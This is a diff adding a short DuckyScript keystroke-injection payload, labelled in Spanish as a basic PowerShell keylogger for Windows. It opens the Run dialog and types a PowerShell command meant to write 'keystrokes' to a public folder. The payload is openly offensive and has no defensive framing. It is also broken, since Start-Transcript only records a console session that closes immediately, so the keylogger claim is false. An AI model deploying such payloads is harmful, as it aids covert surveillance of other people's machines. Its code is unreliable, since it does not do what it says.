@@ -1,0 +1,6 @@
+REM Keylogger Básico en PowerShell (Windows)
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Transcript -Path C:\Users\Public\keystrokes.txt"
+ENTER
